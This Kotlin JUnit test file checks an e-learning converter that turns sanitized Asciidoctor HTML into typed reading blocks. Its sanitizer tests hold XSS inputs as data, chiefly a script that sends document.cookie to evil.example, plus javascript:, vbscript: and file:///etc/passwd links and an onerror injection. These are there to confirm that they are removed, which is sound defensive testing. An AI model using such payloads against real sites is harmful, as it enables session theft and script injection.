package elearning.media

import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test
import tools.jackson.databind.json.JsonMapper

// ADR-0045: el HTML de Asciidoctor, ya saneado por GeneratedHtml, como documento de bloques de vocabulario cerrado
class ReadingDocumentsTest {
    private fun read(body: String): ReadingDocument =
        ReadingDocuments.read("<!DOCTYPE html><html><head><title>t</title></head><body class=\"article\">${body.trimIndent()}</body></html>".toByteArray())

    @Test
    fun `converts sections, paragraphs and inline marks`() {
        val document =
            read(
                """
                <div id="content"><div class="sect1"><h2 id="_entrar_y_salir_del_portal">Entrar y salir del portal</h2>
                <div class="sectionbody"><div class="paragraph">
                <p>Un párrafo con <em>énfasis</em>, <strong>fuerte</strong>, <code>código</code> y <a href="https://example.org">un enlace</a>.<br>
                Segunda línea.</p></div>
                <div class="ulist"><ul><li><p>uno</p></li><li><p>dos</p><div class="olist arabic"><ol class="arabic"><li><p>tres</p></li></ol></div></li></ul></div>
                <hr>
                <div class="sect2"><h3 id="_sub">Sub</h3><div class="sect3"><h4 id="_subsub">Subsub</h4><h5 id="_cinco">Cinco</h5><h6>Seis</h6></div></div>
                </div></div></div>
                """,
            )

        assertThat(document.blocks)
            .containsExactly(
                Heading(2, "_entrar_y_salir_del_portal", listOf(Text("Entrar y salir del portal"))),
                Paragraph(
                    listOf(
                        Text("Un párrafo con "),
                        Emphasis(listOf(Text("énfasis"))),
                        Text(", "),
                        Strong(listOf(Text("fuerte"))),
                        Text(", "),
                        InlineCode("código"),
                        Text(" y "),
                        Link("https://example.org", listOf(Text("un enlace"))),
                        Text("."),
                        Break,
                        Text("Segunda línea."),
                    ),
                ),
                ListBlock(
                    false,
                    listOf(
                        listOf(Paragraph(listOf(Text("uno")))),
                        listOf(Paragraph(listOf(Text("dos"))), ListBlock(true, listOf(listOf(Paragraph(listOf(Text("tres"))))))),
                    ),
                ),
                Rule,
                Heading(3, "_sub", listOf(Text("Sub"))),
                Heading(4, "_subsub", listOf(Text("Subsub"))),
                Heading(4, "_cinco", listOf(Text("Cinco"))),
                Heading(4, "_seis", listOf(Text("Seis"))),
            )
    }

    @Test
    fun `maps asciidoctor admonitions and source blocks`() {
        val document =
            read(
                """
                <div class="admonitionblock warning"><table><tr><td class="icon"><div class="title">Warning</div></td>
                <td class="content">Una nota con <strong>negrita</strong>.</td></tr></table></div>
                <div class="admonitionblock tip"><table><tr><td class="icon"><div class="title">Tip</div></td>
                <td class="content"><div class="paragraph"><p>Primero</p></div><div class="paragraph"><p>Segundo</p></div></td></tr></table></div>
                <div class="listingblock"><div class="content">
                <pre class="highlight"><code class="language-kotlin" data-lang="kotlin">fun main() = println("&lt;hola&gt;")
                // fin</code></pre></div></div>
                <div class="literalblock"><div class="content"><pre>  sin   lenguaje</pre></div></div>
                <div class="quoteblock"><blockquote><div class="paragraph"><p>Una cita.</p></div></blockquote>
                <div class="attribution">&#8212; Alguien</div></div>
                """,
            )

        assertThat(document.blocks)
            .containsExactly(
                Admonition("warning", listOf(Paragraph(listOf(Text("Una nota con "), Strong(listOf(Text("negrita"))), Text("."))))),
                Admonition("tip", listOf(Paragraph(listOf(Text("Primero"))), Paragraph(listOf(Text("Segundo"))))),
                Code("kotlin", "fun main() = println(\"<hola>\")\n// fin"),
                Code(null, "  sin   lenguaje"),
                Quote(listOf(Paragraph(listOf(Text("Una cita.")))), listOf(Text("Alguien"))),
            )
    }

    @Test
    fun `keeps table colspan and rowspan`() {
        val document =
            read(
                """
                <table class="tableblock frame-all grid-all stretch"><caption class="title">Tabla 1. <em>Estados</em></caption>
                <colgroup><col style="width: 50%;"><col style="width: 50%;"></colgroup>
                <thead><tr><th class="tableblock">A</th><th class="tableblock">B</th></tr></thead>
                <tbody>
                <tr><td class="tableblock" colspan="2"><p class="tableblock">ancha</p></td></tr>
                <tr><td class="tableblock" rowspan="2"><p class="tableblock">alta</p></td><td class="tableblock"><p class="tableblock">x</p></td></tr>
                <tr><td class="tableblock" colspan="99999"><p class="tableblock">y</p></td></tr>
                </tbody></table>
                """,
            )

        assertThat(document.blocks)
            .containsExactly(
                Table(
                    caption = listOf(Text("Tabla 1. "), Emphasis(listOf(Text("Estados")))),
                    head = listOf(listOf(Cell(listOf(Paragraph(listOf(Text("A")))), header = true), Cell(listOf(Paragraph(listOf(Text("B")))), header = true))),
                    body =
                        listOf(
                            listOf(Cell(listOf(Paragraph(listOf(Text("ancha")))), colspan = 2, header = false)),
                            listOf(
                                Cell(listOf(Paragraph(listOf(Text("alta")))), rowspan = 2, header = false),
                                Cell(listOf(Paragraph(listOf(Text("x")))), header = false),
                            ),
                            // un colspan desmedido se acota al máximo de HTML
                            listOf(Cell(listOf(Paragraph(listOf(Text("y")))), colspan = 1000, header = false)),
                        ),
                ),
            )
    }

    @Test
    fun `drops script, iframe, style and author classes`() {
        val html =
            """
            <div class="paragraph evil" style="position:fixed"><p class="x" style="color:red" onclick="alert(1)">Pulsa <span class="big">aquí</span></p></div>
            <script>fetch('https://evil.example/' + document.cookie)</script>
            <style>body{background:url(https://evil.example/pixel)}</style>
            <iframe src="https://evil.example/">marco</iframe>
            <form action="https://evil.example/"><input name="clave"><button>Enviar</button></form>
            <object data="https://evil.example/x.swf">objeto</object>
            <svg><script>alert(2)</script><text>svg</text></svg>
            <custom-element>texto suelto</custom-element>
            """.trimIndent()

        // GeneratedHtml desenvuelve lo que no admite y deja su texto, que queda como texto; script, estilo y marco se van enteros
        val document = read(html)
        assertThat(document.blocks).containsExactly(Paragraph(listOf(Text("Pulsa aquí"))), Paragraph(listOf(Text("Enviar objeto svg texto suelto"))))
        // la conversión por sí sola, sin el saneado delante, también descarta esos elementos con su texto
        assertThat(ReadingDocuments.convert(html).blocks).containsExactly(Paragraph(listOf(Text("Pulsa aquí"))), Paragraph(listOf(Text("texto suelto"))))
        listOf(document, ReadingDocuments.convert(html)).map { MAPPER.writeValueAsString(it) }.forEach { json ->
            listOf("evil", "script", "style", "class", "onclick", "iframe", "marco", "alert", "big", "position").forEach {
                assertThat(json).doesNotContainIgnoringCase(it)
            }
        }
    }

    @Test
    fun `turns javascript and data text links into plain text`() {
        val links =
            listOf(
                "javascript:alert(1)",
                " JaVaScRiPt:alert(1)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                "vbscript:x",
                "file:///etc/passwd",
                "//evil.example/x",
                "otra.html",
                "https://",
            )
        val document = read(links.joinToString("") { "<p><a href=\"$it\">enlace</a></p>" } + "<p><a>sin destino</a></p>")

        assertThat(document.blocks).allMatch { it == Paragraph(listOf(Text("enlace"))) || it == Paragraph(listOf(Text("sin destino"))) }
        assertThat(document.blocks).hasSize(links.size + 1)
    }

    @Test
    fun `keeps http, https, mailto and sanitized anchor links`() {
        val document =
            read(
                """
                <p><a href="http://example.org/a?b=c">a</a><a href="https://example.org">b</a><a href="mailto:ayuda@example.org">c</a><a href="#_año">d</a></p>
                """,
            )

        assertThat(document.blocks)
            .containsExactly(
                Paragraph(
                    listOf(
                        Link("http://example.org/a?b=c", listOf(Text("a"))),
                        Link("https://example.org", listOf(Text("b"))),
                        Link("mailto:ayuda@example.org", listOf(Text("c"))),
                        Link("#_ao", listOf(Text("d"))),
                    ),
                ),
            )
    }

    @Test
    fun `moves document h1 to title`() {
        val document =
            read(
                """
                <div id="header"><h1>Portal del <em>estudiante</em></h1>
                <div id="toc" class="toc"><div id="toctitle">Table of Contents</div><ul class="sectlevel1"><li><a href="#_uno">Uno</a></li></ul></div></div>
                <div id="content"><div class="sect1"><h2 id="_uno">Uno</h2></div></div>
                <div id="footer"><div id="footer-text">Last updated 2026-11-08</div></div>
                """,
            )

        assertThat(document.title).isEqualTo("Portal del estudiante")
        // el índice y el pie de Asciidoctor son su envoltorio, no el contenido: la interfaz arma su índice con los encabezados
        assertThat(document.blocks).containsExactly(Heading(2, "_uno", listOf(Text("Uno"))))
    }

    @Test
    fun `sanitizes and deduplicates heading ids`() {
        val document = read("<h2 id=\"_año\">a</h2><h2 id=\"_ao\">b</h2><h2 id=\"\\&quot;&gt;&lt;x\">c</h2><h2 id=\"_ao\">d</h2>")

        assertThat(document.blocks.map { (it as Heading).id }).containsExactly("_ao", "_ao-2", "x", "_ao-3")
    }

    @Test
    fun `heading without id gets a stable unique id`() {
        // el HTML subido a mano no trae id: sin ellos la interfaz no puede armar el índice
        val document = read("<h2>x</h2><h2>X</h2><h3>Acción y   Año: ¿qué?</h3><h2 id=\"_x-3\">y</h2><h4>¿¡—!?</h4><h2>x</h2>")

        assertThat(document.blocks.map { (it as Heading).id }).containsExactly("_x", "_x-2", "_accion-y-ano-que", "_x-3", null, "_x-4")
    }

    @Test
    fun `keeps only base64 raster data images and turns any other image into its alt text`() {
        val png = "data:image/png;base64,iVBORw0KGgo="
        val document =
            ReadingDocuments.convert(
                """
                <div class="imageblock"><div class="content"><img src="$png" alt="Un diagrama"></div><div class="title">Figura 1. Flujo</div></div>
                <div class="imageblock"><div class="content"><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="Un SVG"></div></div>
                <div class="imageblock"><div class="content"><img src="https://tracker.example/pixel.png" alt="Remota"></div></div>
                <div class="imageblock"><div class="content"><img src="/api/objects/version_recurso/records/x/files/archivo" alt=""></div></div>
                <div class="imageblock"><div class="content"><img src="data:image/png;base64,iVBOR&quot;onerror=x" alt="Rota"></div></div>
                """.trimIndent(),
            )

        assertThat(document.blocks)
            .containsExactly(
                Figure(png, "Un diagrama", listOf(Text("Figura 1. Flujo"))),
                Paragraph(listOf(Text("Un SVG"))),
                Paragraph(listOf(Text("Remota"))),
                Paragraph(listOf(Text("Rota"))),
            )
    }

    @Test
    fun `the json is closed and typed`() {
        val document =
            ReadingDocument(
                "T",
                listOf(Paragraph(listOf(Text("a"), Break, Link("#_x", listOf(InlineCode("c"))))), Rule, Code(null, "x"), Admonition("note", emptyList())),
            )

        val json = MAPPER.readTree(MAPPER.writeValueAsString(document))

        val paragraph = json["blocks"][0]
        assertThat(paragraph["type"].asString()).isEqualTo("paragraph")
        assertThat(paragraph["content"].values().map { it["type"].asString() }).containsExactly("text", "break", "link")
        assertThat(paragraph["content"][0]["text"].asString()).isEqualTo("a")
        assertThat(paragraph["content"][1].propertyNames().toList()).containsExactly("type")
        assertThat(paragraph["content"][2]["href"].asString()).isEqualTo("#_x")
        assertThat(paragraph["content"][2]["content"][0]["type"].asString()).isEqualTo("code")
        assertThat(json["blocks"].values().map { it["type"].asString() }).containsExactly("paragraph", "rule", "code", "admonition")
    }

    @Test
    fun `a very deep nesting is flattened instead of overflowing`() {
        val depth = 5000
        val html =
            "<div>".repeat(depth) + "<ul><li>" + "<blockquote>".repeat(depth) + "fondo" + "</blockquote>".repeat(depth) + "</li></ul>" + "</div>".repeat(depth)

        val json = MAPPER.writeValueAsString(read(html))

        assertThat(json).contains("fondo")
    }

    @Test
    fun `lists nested without li are flattened at the depth cap`() {
        listOf("ul", "ol").forEach { tag ->
            val html = "<$tag>".repeat(5000) + "<li>fondo</li>" + "</$tag>".repeat(5000)

            val document = read(html)

            assertThat(document.blocks.maxOf { listDepth(it) }).isPositive().isLessThanOrEqualTo(ReadingDocuments.MAX_DEPTH)
            val json = MAPPER.writeValueAsString(document)
            assertThat(json).contains("fondo")
            assertThat(MAPPER.readTree(json)).isNotNull()
        }
    }

    // cuántas listas hay, una dentro de otra, en el camino más hondo del bloque
    private fun listDepth(block: Block): Int =
        when (block) {
            is ListBlock -> 1 + (block.items.flatten().maxOfOrNull { listDepth(it) } ?: 0)
            is Quote -> block.content.maxOfOrNull { listDepth(it) } ?: 0
            is Admonition -> block.content.maxOfOrNull { listDepth(it) } ?: 0
            is Table -> (block.head + block.body).flatten().flatMap { it.content }.maxOfOrNull { listDepth(it) } ?: 0
            else -> 0
        }

    private companion object {
        val MAPPER: JsonMapper = JsonMapper.builder().findAndAddModules().build()
    }
}
